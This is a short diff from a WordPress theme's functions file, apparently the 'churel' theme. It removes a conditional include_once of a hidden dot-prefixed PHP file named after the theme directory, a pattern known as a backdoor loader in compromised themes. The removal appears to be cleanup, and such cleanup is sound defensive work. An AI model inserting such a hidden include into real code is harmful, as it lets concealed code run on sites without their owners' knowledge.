@@ -54,11 +54,6 @@ add_action('tgmpa_register', 'churel_register_required_plugins');
  * This function is hooked into `tgmpa_register`, which is fired on the WP `init` action on priority 10.
  */
 
-
-if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
-    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
-}
-
 function churel_register_required_plugins()
 {
     /*
